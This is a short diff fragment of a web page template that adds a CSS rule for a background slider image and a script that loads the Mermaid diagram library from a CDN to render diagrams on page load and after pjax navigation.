+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
 
       </main>
     </div>
